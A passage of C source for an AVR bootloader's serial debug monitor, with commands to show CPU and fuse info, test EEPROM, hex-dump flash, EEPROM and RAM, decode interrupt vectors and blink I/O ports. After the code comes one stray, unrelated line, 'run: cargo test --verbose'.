	prog_char	gTextMsg_FUSE_BYTE_LOCK[]	PROGMEM	=	"Lock fuse    = ";
	prog_char	gTextMsg_GCC_DATE_STR[]		PROGMEM	=	__DATE__;
	prog_char	gTextMsg_AVR_LIBC_VER_STR[]	PROGMEM	=	__AVR_LIBC_VERSION_STRING__;
	prog_char	gTextMsg_GCC_VERSION_STR[]	PROGMEM	=	__VERSION__;
	prog_char	gTextMsg_VECTOR_HEADER[]	PROGMEM	=	"V#   ADDR   op code     instruction addr   Interrupt";
	prog_char	gTextMsg_noVector[]			PROGMEM	=	"no vector";
	prog_char	gTextMsg_rjmp[]				PROGMEM	=	"rjmp  ";
	prog_char	gTextMsg_jmp[]				PROGMEM	=	"jmp ";
	prog_char	gTextMsg_WHAT_PORT[]		PROGMEM	=	"What port:";
	prog_char	gTextMsg_PortNotSupported[]	PROGMEM	=	"Port not supported";
	prog_char	gTextMsg_MustBeLetter[]		PROGMEM	=	"Must be a letter";
	prog_char	gTextMsg_SPACE[]			PROGMEM	=	" ";
	prog_char	gTextMsg_WriteToEEprom[]	PROGMEM	=	"Writting EE";
	prog_char	gTextMsg_ReadingEEprom[]	PROGMEM	=	"Reading EE";
	prog_char	gTextMsg_EEPROMerrorCnt[]	PROGMEM	=	"eeprom error count=";
	prog_char	gTextMsg_PORT[]				PROGMEM	=	"PORT";


//************************************************************************
//*	Help messages
	prog_char	gTextMsg_HELP_MSG_0[]		PROGMEM	=	"0=Zero address ctrs";
	prog_char	gTextMsg_HELP_MSG_QM[]		PROGMEM	=	"?=CPU stats";
	prog_char	gTextMsg_HELP_MSG_AT[]		PROGMEM	=	"@=EEPROM test";
	prog_char	gTextMsg_HELP_MSG_B[]		PROGMEM	=	"B=Blink LED";
	prog_char	gTextMsg_HELP_MSG_E[]		PROGMEM	=	"E=Dump EEPROM";
	prog_char	gTextMsg_HELP_MSG_F[]		PROGMEM	=	"F=Dump FLASH";
	prog_char	gTextMsg_HELP_MSG_H[]		PROGMEM	=	"H=Help";
	prog_char	gTextMsg_HELP_MSG_L[]		PROGMEM	=	"L=List I/O Ports";
	prog_char	gTextMsg_HELP_MSG_Q[]		PROGMEM	=	"Q=Quit & jump to user pgm";
	prog_char	gTextMsg_HELP_MSG_R[]		PROGMEM	=	"R=Dump RAM";
	prog_char	gTextMsg_HELP_MSG_V[]		PROGMEM	=	"V=show interrupt Vectors";
	prog_char	gTextMsg_HELP_MSG_Y[]		PROGMEM	=	"Y=Port blink";

	prog_char	gTextMsg_END[]				PROGMEM	=	"*";


//************************************************************************
void	PrintFromPROGMEM(void *dataPtr, unsigned char offset)
{
uint8_t	ii;
char	theChar;

	ii			=	offset;
	theChar		=	1;

	while (theChar != 0)
	{
	#if (FLASHEND > 0x10000)
		theChar	=	pgm_read_byte_far((uint32_t)dataPtr + ii);
	#else
		theChar	=	pgm_read_byte_near((uint32_t)dataPtr + ii);
	#endif
		if (theChar != 0)
		{
			sendchar(theChar);
		}
		ii++;
	}
}

//************************************************************************
void	PrintNewLine(void)
{
	sendchar(0x0d);
	sendchar(0x0a);
}


//************************************************************************
void	PrintFromPROGMEMln(void *dataPtr, unsigned char offset)
{
	PrintFromPROGMEM(dataPtr, offset);

	PrintNewLine();
}


//************************************************************************
void	PrintString(char *textString)
{
char	theChar;
int		ii;

	theChar		=	1;
	ii			=	0;
	while (theChar != 0)
	{
		theChar	=	textString[ii];
		if (theChar != 0)
		{
			sendchar(theChar);
		}
		ii++;
	}
}

//************************************************************************
void	PrintHexByte(unsigned char theByte)
{
char	theChar;

	theChar	=	0x30 + ((theByte >> 4) & 0x0f);
	if (theChar > 0x39)
	{
		theChar	+=	7;
	}
	sendchar(theChar );

	theChar	=	0x30 + (theByte & 0x0f);
	if (theChar > 0x39)
	{
		theChar	+=	7;
	}
	sendchar(theChar );
}

//************************************************************************
void	PrintDecInt(int theNumber, int digitCnt)
{
int	theChar;
int	myNumber;

	myNumber	=	theNumber;

	if ((myNumber > 100) || (digitCnt >= 3))
	{
		theChar		=	0x30 + myNumber / 100;
		sendchar(theChar );
	}

	if ((myNumber > 10) || (digitCnt >= 2))
	{
		theChar	=	0x30  + ((myNumber % 100) / 10 );
		sendchar(theChar );
	}
	theChar	=	0x30 + (myNumber % 10);
	sendchar(theChar );
}




//************************************************************************
static void	PrintCPUstats(void)
{
unsigned char fuseByte;

	PrintFromPROGMEMln(gTextMsg_Explorer, 0);

	PrintFromPROGMEM(gTextMsg_COMPILED_ON, 0);
	PrintFromPROGMEMln(gTextMsg_GCC_DATE_STR, 0);

	PrintFromPROGMEM(gTextMsg_CPU_Type, 0);
	PrintFromPROGMEMln(gTextMsg_CPU_Name, 0);

	PrintFromPROGMEM(gTextMsg_AVR_ARCH, 0);
	PrintDecInt(__AVR_ARCH__, 1);
	PrintNewLine();

	PrintFromPROGMEM(gTextMsg_GCC_VERSION, 0);
	PrintFromPROGMEMln(gTextMsg_GCC_VERSION_STR, 0);

	//*	these can be found in avr/version.h
	PrintFromPROGMEM(gTextMsg_AVR_LIBC, 0);
	PrintFromPROGMEMln(gTextMsg_AVR_LIBC_VER_STR, 0);

#if defined(SIGNATURE_0)
	PrintFromPROGMEM(gTextMsg_CPU_SIGNATURE, 0);
	//*	these can be found in avr/iomxxx.h
	PrintHexByte(SIGNATURE_0);
	PrintHexByte(SIGNATURE_1);
	PrintHexByte(SIGNATURE_2);
	PrintNewLine();
#endif


#if defined(GET_LOW_FUSE_BITS)
	//*	fuse settings
	PrintFromPROGMEM(gTextMsg_FUSE_BYTE_LOW, 0);
	fuseByte	=	boot_lock_fuse_bits_get(GET_LOW_FUSE_BITS);
	PrintHexByte(fuseByte);
	PrintNewLine();

	PrintFromPROGMEM(gTextMsg_FUSE_BYTE_HIGH, 0);
	fuseByte	=	boot_lock_fuse_bits_get(GET_HIGH_FUSE_BITS);
	PrintHexByte(fuseByte);
	PrintNewLine();

	PrintFromPROGMEM(gTextMsg_FUSE_BYTE_EXT, 0);
	fuseByte	=	boot_lock_fuse_bits_get(GET_EXTENDED_FUSE_BITS);
	PrintHexByte(fuseByte);
	PrintNewLine();

	PrintFromPROGMEM(gTextMsg_FUSE_BYTE_LOCK, 0);
	fuseByte	=	boot_lock_fuse_bits_get(GET_LOCK_BITS);
	PrintHexByte(fuseByte);
	PrintNewLine();

#endif

}

#ifndef sbi
	#define sbi(sfr, bit) (_SFR_BYTE(sfr) |= _BV(bit))
#endif

//************************************************************************
int analogRead(uint8_t pin)
{
uint8_t low, high;

	// set the analog reference (high two bits of ADMUX) and select the
	// channel (low 4 bits).  this also sets ADLAR (left-adjust result)
	// to 0 (the default).
//	ADMUX	=	(analog_reference << 6) | (pin & 0x07);
	ADMUX	=	(1 << 6) | (pin & 0x07);

#if defined(__AVR_ATmega1280__) || defined(__AVR_ATmega2560__)
	// the MUX5 bit of ADCSRB selects whether we're reading from channels
	// 0 to 7 (MUX5 low) or 8 to 15 (MUX5 high).
	ADCSRB	=	(ADCSRB & ~(1 << MUX5)) | (((pin >> 3) & 0x01) << MUX5);
#endif

	// without a delay, we seem to read from the wrong channel
	//delay(1);

	// start the conversion
	sbi(ADCSRA, ADSC);

	// ADSC is cleared when the conversion finishes
	while (bit_is_set(ADCSRA, ADSC));

	// we have to read ADCL first; doing so locks both ADCL
	// and ADCH until ADCH is read.  reading ADCL second would
	// cause the results of each conversion to be discarded,
	// as ADCL and ADCH would be locked when it completed.
	low		=	ADCL;
	high	=	ADCH;

	// combine the two bytes
	return (high << 8) | low;
}

//************************************************************************
static void BlinkLED(void)
{
	PROGLED_DDR		|=	(1<<PROGLED_PIN);
	PROGLED_PORT	|=	(1<<PROGLED_PIN);	// active high LED ON

	while (!Serial_Available())
	{
		PROGLED_PORT	&=	~(1<<PROGLED_PIN);	// turn LED off
		delay_ms(100);
		PROGLED_PORT	|=	(1<<PROGLED_PIN);	// turn LED on
		delay_ms(100);
	}
	recchar();	//	get the char out of the buffer
}

enum
{
	kDUMP_FLASH	=	0,
	kDUMP_EEPROM,
	kDUMP_RAM
};

//************************************************************************
static void	DumpHex(unsigned char dumpWhat, unsigned long startAddress, unsigned char numRows)
{
unsigned long	myAddressPointer;
uint8_t			ii;
unsigned char	theValue;
char			asciiDump[18];
unsigned char	*ramPtr;


	ramPtr				=	0;
	theValue			=	0;
	myAddressPointer	=	startAddress;
	while (numRows > 0)
	{
		if (myAddressPointer > 0x10000)
		{
			PrintHexByte((myAddressPointer >> 16) & 0x00ff);
		}
		PrintHexByte((myAddressPointer >> 8) & 0x00ff);
		PrintHexByte(myAddressPointer & 0x00ff);
		sendchar(0x20);
		sendchar('-');
		sendchar(0x20);

		asciiDump[0]		=	0;
		for (ii=0; ii<16; ii++)
		{
			switch(dumpWhat)
			{
				case kDUMP_FLASH:
				#if (FLASHEND > 0x10000)
					theValue	=	pgm_read_byte_far(myAddressPointer);
				#else
					theValue	=	pgm_read_byte_near(myAddressPointer);
				#endif
					break;

				case kDUMP_EEPROM:
					theValue	=	eeprom_read_byte((void *)myAddressPointer);
					break;

				case kDUMP_RAM:
					theValue	=	ramPtr[myAddressPointer];
					break;

			}
			PrintHexByte(theValue);
			sendchar(0x20);
			if ((theValue >= 0x20) && (theValue < 0x7f))
			{
				asciiDump[ii % 16]	=	theValue;
			}
			else
			{
				asciiDump[ii % 16]	=	'.';
			}

			myAddressPointer++;
		}
		asciiDump[16]	=	0;
		PrintString(asciiDump);
		PrintNewLine();

		numRows--;
	}
}



//************************************************************************
//*	returns amount of extended memory
static void	EEPROMtest(void)
{
int		ii;
char	theChar;
char	theEEPROMchar;
int		errorCount;

	PrintFromPROGMEMln(gTextMsg_WriteToEEprom, 0);
	PrintNewLine();
	ii			=	0;
#if (FLASHEND > 0x10000)
	while (((theChar = pgm_read_byte_far(gTextMsg_Explorer + ii)) != '*') && (ii < 512))
#else
	while (((theChar = pgm_read_byte_near(gTextMsg_Explorer + ii)) != '*') && (ii < 512))
#endif
	{
		eeprom_write_byte((uint8_t *)ii, theChar);
		if (theChar == 0)
		{
			PrintFromPROGMEM(gTextMsg_SPACE, 0);
		}
		else
		{
			sendchar(theChar);
		}
		ii++;
	}

	//*	no go back through and test
	PrintNewLine();
	PrintNewLine();
	PrintFromPROGMEMln(gTextMsg_ReadingEEprom, 0);
	PrintNewLine();
	errorCount	=	0;
	ii			=	0;
#if (FLASHEND > 0x10000)
	while (((theChar = pgm_read_byte_far(gTextMsg_Explorer + ii)) != '*') && (ii < 512))
#else
	while (((theChar = pgm_read_byte_near(gTextMsg_Explorer + ii)) != '*') && (ii < 512))
#endif
	{
		theEEPROMchar	=	eeprom_read_byte((uint8_t *)ii);
		if (theEEPROMchar == 0)
		{
			PrintFromPROGMEM(gTextMsg_SPACE, 0);
		}
		else
		{
			sendchar(theEEPROMchar);
		}
		if (theEEPROMchar != theChar)
		{
			errorCount++;
		}
		ii++;
	}
	PrintNewLine();
	PrintNewLine();
	PrintFromPROGMEM(gTextMsg_EEPROMerrorCnt, 0);
	PrintDecInt(errorCount, 1);
	PrintNewLine();
	PrintNewLine();

	gEepromIndex	=	0;	//*	set index back to zero for next eeprom dump

}



#if (FLASHEND > 0x08000)
	#include	"avrinterruptnames.h"
	#ifndef _INTERRUPT_NAMES_DEFINED_
		#warning Interrupt vectors not defined
	#endif
#endif

//************************************************************************
static void	VectorDisplay(void)
{
unsigned long	byte1;
unsigned long	byte2;
unsigned long	byte3;
unsigned long	byte4;
unsigned long	word1;
unsigned long	word2;
int				vectorIndex;
unsigned long	myMemoryPtr;
unsigned long	wordMemoryAddress;
unsigned long	realitiveAddr;
unsigned long	myFullAddress;
unsigned long	absoluteAddr;
#if defined(_INTERRUPT_NAMES_DEFINED_)
	long		stringPointer;
#endif

	myMemoryPtr		=	0;
	vectorIndex		=	0;
	PrintFromPROGMEMln(gTextMsg_CPU_Name, 0);
	PrintFromPROGMEMln(gTextMsg_VECTOR_HEADER, 0);
	//					 V#   ADDR   op code
	//					  1 - 0000 = C3 BB 00 00 rjmp 03BB >000776 RESET
	while (vectorIndex < kInterruptVectorCount)
	{
		wordMemoryAddress	=	myMemoryPtr / 2;
		//					 01 - 0000 = 12 34
		PrintDecInt(vectorIndex + 1, 2);
		sendchar(0x20);
		sendchar('-');
		sendchar(0x20);
		PrintHexByte((wordMemoryAddress >> 8) & 0x00ff);
		PrintHexByte((wordMemoryAddress) & 0x00ff);
		sendchar(0x20);
		sendchar('=');
		sendchar(0x20);

	
		//*	the AVR is LITTLE ENDIAN, swap the byte order
	#if (FLASHEND > 0x10000)
		byte1	=	pgm_read_byte_far(myMemoryPtr++);
		byte2	=	pgm_read_byte_far(myMemoryPtr++);
		byte3	=	pgm_read_byte_far(myMemoryPtr++);
		byte4	=	pgm_read_byte_far(myMemoryPtr++);
	#else
		byte1	=	pgm_read_byte_near(myMemoryPtr++);
		byte2	=	pgm_read_byte_near(myMemoryPtr++);
		byte3	=	pgm_read_byte_near(myMemoryPtr++);
		byte4	=	pgm_read_byte_near(myMemoryPtr++);
	#endif
		word1	=	(byte2 << 8) + byte1;
		word2	=	(byte4 << 8) + byte3;


		PrintHexByte(byte2);
		sendchar(0x20);
		PrintHexByte(byte1);
		sendchar(0x20);
		PrintHexByte(byte4);
		sendchar(0x20);
		PrintHexByte(byte3);
		sendchar(0x20);
	
		if (word1 == 0xffff)
		{
			PrintFromPROGMEM(gTextMsg_noVector, 0);
		}
		else if ((word1 & 0xc000) == 0xc000)
		{
			//*	rjmp instruction
			realitiveAddr	=	word1 & 0x3FFF;
			absoluteAddr	=	wordMemoryAddress + realitiveAddr;	//*	add the offset to the current address
			absoluteAddr	=	absoluteAddr << 1;					//*	multiply by 2 for byte address

			PrintFromPROGMEM(gTextMsg_rjmp, 0);
			PrintHexByte((realitiveAddr >> 8) & 0x00ff);
			PrintHexByte((realitiveAddr) & 0x00ff);
			sendchar(0x20);
			sendchar('>');
			PrintHexByte((absoluteAddr >> 16) & 0x00ff);
			PrintHexByte((absoluteAddr >> 8) & 0x00ff);
			PrintHexByte((absoluteAddr) & 0x00ff);
	
		}
		else if ((word1 & 0xfE0E) == 0x940c)
		{
			//*	jmp instruction, this is REALLY complicated, refer to the instruction manual (JMP)
			myFullAddress	=	((byte1 & 0x01) << 16) +
								((byte1 & 0xf0) << 17) +
								((byte2 & 0x01) << 21) +
								word2;
							
			absoluteAddr	=	myFullAddress << 1;
							
			PrintFromPROGMEM(gTextMsg_jmp, 0);
			PrintHexByte((myFullAddress >> 16) & 0x00ff);
			PrintHexByte((myFullAddress >> 8) & 0x00ff);
			PrintHexByte((myFullAddress) & 0x00ff);
			sendchar(0x20);
			sendchar('>');
			PrintHexByte((absoluteAddr >> 16) & 0x00ff);
			PrintHexByte((absoluteAddr >> 8) & 0x00ff);
			PrintHexByte((absoluteAddr) & 0x00ff);
		}

	#if defined(_INTERRUPT_NAMES_DEFINED_)
		sendchar(0x20);
	#if (FLASHEND > 0x10000)
		stringPointer	=	pgm_read_word_far(&(gInterruptNameTable[vectorIndex]));
	#else
		stringPointer	=	pgm_read_word_near(&(gInterruptNameTable[vectorIndex]));
	#endif
		PrintFromPROGMEM((char *)stringPointer, 0);
	#endif
		PrintNewLine();

		vectorIndex++;
	}
}

//************************************************************************
static void	PrintAvailablePort(char thePortLetter)
{
	PrintFromPROGMEM(gTextMsg_PORT, 0);
	sendchar(thePortLetter);
	PrintNewLine();
}

//************************************************************************
static void	ListAvailablePorts(void)
{

#ifdef DDRA
	PrintAvailablePort('A');
#endif

#ifdef DDRB
	PrintAvailablePort('B');
#endif

#ifdef DDRC
	PrintAvailablePort('C');
#endif

#ifdef DDRD
	PrintAvailablePort('D');
#endif

#ifdef DDRE
	PrintAvailablePort('E');
#endif

#ifdef DDRF
	PrintAvailablePort('F');
#endif

#ifdef DDRG
	PrintAvailablePort('G');
#endif

#ifdef DDRH
	PrintAvailablePort('H');
#endif

#ifdef DDRI
	PrintAvailablePort('I');
#endif

#ifdef DDRJ
	PrintAvailablePort('J');
#endif

#ifdef DDRK
	PrintAvailablePort('K');
#endif

#ifdef DDRL
	PrintAvailablePort('L');
#endif

}

//************************************************************************
static void	AVR_PortOutput(void)
{
char	portLetter;
char	getCharFlag;

	PrintFromPROGMEM(gTextMsg_WHAT_PORT, 0);

	portLetter	=	recchar();
	portLetter	=	portLetter & 0x5f;
	sendchar(portLetter);
	PrintNewLine();

	if ((portLetter >= 'A') && (portLetter <= 'Z'))
	{
		getCharFlag	=	true;
		switch(portLetter)
		{
		#ifdef DDRA
			case 'A':
				DDRA	=	0xff;
				while (!Serial_Available())
				{
					PORTA	^=	0xff;
					delay_ms(200);
				}
				PORTA	=	0;
				break;
		#endif

		#ifdef DDRB
			case 'B':
				DDRB	=	0xff;
				while (!Serial_Available())
				{
					PORTB	^=	0xff;
					delay_ms(200);
				}
				PORTB	=	0;
				break;
		#endif

		#ifdef DDRC
			case 'C':
				DDRC	=	0xff;
				while (!Serial_Available())
				{
					PORTC	^=	0xff;
					delay_ms(200);
				}
				PORTC	=	0;
				break;
		#endif

		#ifdef DDRD
			case 'D':
				DDRD	=	0xff;
				while (!Serial_Available())
				{
					PORTD	^=	0xff;
					delay_ms(200);
				}
				PORTD	=	0;
				break;
		#endif

		#ifdef DDRE
			case 'E':
				DDRE	=	0xff;
				while (!Serial_Available())
				{
					PORTE	^=	0xff;
					delay_ms(200);
				}
				PORTE	=	0;
				break;
		#endif

		#ifdef DDRF
			case 'F':
				DDRF	=	0xff;
				while (!Serial_Available())
				{
					PORTF	^=	0xff;
					delay_ms(200);
				}
				PORTF	=	0;
				break;
		#endif

		#ifdef DDRG
			case 'G':
				DDRG	=	0xff;
				while (!Serial_Available())
				{
					PORTG	^=	0xff;
					delay_ms(200);
				}
				PORTG	=	0;
				break;
		#endif

		#ifdef DDRH
			case 'H':
				DDRH	=	0xff;
				while (!Serial_Available())
				{
					PORTH	^=	0xff;
					delay_ms(200);
				}
				PORTH	=	0;
				break;
		#endif

		#ifdef DDRI
			case 'I':
				DDRI	=	0xff;
				while (!Serial_Available())
				{
					PORTI	^=	0xff;
					delay_ms(200);
				}
				PORTI	=	0;
				break;
		#endif

		#ifdef DDRJ
			case 'J':
				DDRJ	=	0xff;
				while (!Serial_Available())
				{
					PORTJ	^=	0xff;
					delay_ms(200);
				}
				PORTJ	=	0;
				break;
		#endif

		#ifdef DDRK
			case 'K':
				DDRK	=	0xff;
				while (!Serial_Available())
				{
					PORTK	^=	0xff;
					delay_ms(200);
				}
				PORTK	=	0;
				break;
		#endif

		#ifdef DDRL
			case 'L':
				DDRL	=	0xff;
				while (!Serial_Available())
				{
					PORTL	^=	0xff;
					delay_ms(200);
				}
				PORTL	=	0;
				break;
		#endif

			default:
				PrintFromPROGMEMln(gTextMsg_PortNotSupported, 0);
				getCharFlag	=	false;
				break;
		}
		if (getCharFlag)
		{
			recchar();
		}
	}
	else
	{
		PrintFromPROGMEMln(gTextMsg_MustBeLetter, 0);
	}
}


//*******************************************************************
static void PrintHelp(void)
{
	PrintFromPROGMEMln(gTextMsg_HELP_MSG_0, 0);
	PrintFromPROGMEMln(gTextMsg_HELP_MSG_QM, 0);
	PrintFromPROGMEMln(gTextMsg_HELP_MSG_AT, 0);
	PrintFromPROGMEMln(gTextMsg_HELP_MSG_B, 0);
	PrintFromPROGMEMln(gTextMsg_HELP_MSG_E, 0);
	PrintFromPROGMEMln(gTextMsg_HELP_MSG_F, 0);
	PrintFromPROGMEMln(gTextMsg_HELP_MSG_H, 0);

	PrintFromPROGMEMln(gTextMsg_HELP_MSG_L, 0);
	PrintFromPROGMEMln(gTextMsg_HELP_MSG_Q, 0);
	PrintFromPROGMEMln(gTextMsg_HELP_MSG_R, 0);
	PrintFromPROGMEMln(gTextMsg_HELP_MSG_V, 0);
	PrintFromPROGMEMln(gTextMsg_HELP_MSG_Y, 0);
}

//************************************************************************
static void	RunMonitor(void)
{
char			keepGoing;
unsigned char	theChar;
int				ii, jj;

	for (ii=0; ii<5; ii++)
	{
		for (jj=0; jj<25; jj++)
		{
			sendchar('!');
		}
		PrintNewLine();
	}

	gRamIndex			=	0;
	gFlashIndex			=	0;
	gEepromIndex		=	0;

	PrintFromPROGMEMln(gTextMsg_Explorer, 0);

	keepGoing	=	1;
	while (keepGoing)
	{
		PrintFromPROGMEM(gTextMsg_Prompt, 0);
		theChar	=	recchar();
		if (theChar >= 0x60)
		{
			theChar	=	theChar & 0x5F;
		}
	#if defined( _CEREBOTPLUS_BOARD_ )
		if (theChar == 0x5F)
		{
			
		}
		else
	#endif
		if (theChar >= 0x20)
		{
			sendchar(theChar);
			sendchar(0x20);
		}

		switch(theChar)
		{
			case '0':
				PrintFromPROGMEMln(gTextMsg_HELP_MSG_0, 2);
				gFlashIndex		=	0;
				gRamIndex		=	0;
				gEepromIndex	=	0;
				break;

			case '?':
				PrintFromPROGMEMln(gTextMsg_HELP_MSG_QM, 2);
				PrintCPUstats();
				break;

			case '@':
				PrintFromPROGMEMln(gTextMsg_HELP_MSG_AT, 2);
				EEPROMtest();
				break;

			case 'B':
				PrintFromPROGMEMln(gTextMsg_HELP_MSG_B, 2);
				BlinkLED();
				break;

			case 'E':
				PrintFromPROGMEMln(gTextMsg_HELP_MSG_E, 2);
				DumpHex(kDUMP_EEPROM, gEepromIndex, 16);
				gEepromIndex	+=	256;
				if (gEepromIndex > E2END)
				{
					gEepromIndex	=	0;
				}
				break;
		
			case 'F':
				PrintFromPROGMEMln(gTextMsg_HELP_MSG_F, 2);
				DumpHex(kDUMP_FLASH, gFlashIndex, 16);
				gFlashIndex	+=	256;
				break;

			case 'H':
				PrintFromPROGMEMln(gTextMsg_HELP_MSG_H, 2);
				PrintHelp();
				break;

			case 'L':
				PrintFromPROGMEMln(gTextMsg_HELP_MSG_L, 2);
				ListAvailablePorts();
				break;

			case 'Q':
				PrintFromPROGMEMln(gTextMsg_HELP_MSG_Q, 2);
				keepGoing	=	false;
				break;

			case 'R':
				PrintFromPROGMEMln(gTextMsg_HELP_MSG_R, 2);
				DumpHex(kDUMP_RAM, gRamIndex, 16);
				gRamIndex	+=	256;
				break;

			case 'V':
				PrintFromPROGMEMln(gTextMsg_HELP_MSG_V, 2);
				VectorDisplay();
				break;

			case 'Y':
				PrintFromPROGMEMln(gTextMsg_HELP_MSG_Y, 2);
				AVR_PortOutput();
				break;
			
		#if defined( _CEREBOTPLUS_BOARD_ )
			case 0x5F:
				//*	do nothing
				break;
	 	#endif
	 	
			default:
				PrintFromPROGMEMln(gTextMsg_HUH, 0);
				break;
		}
	}
}

#endif

      run: cargo test --verbose
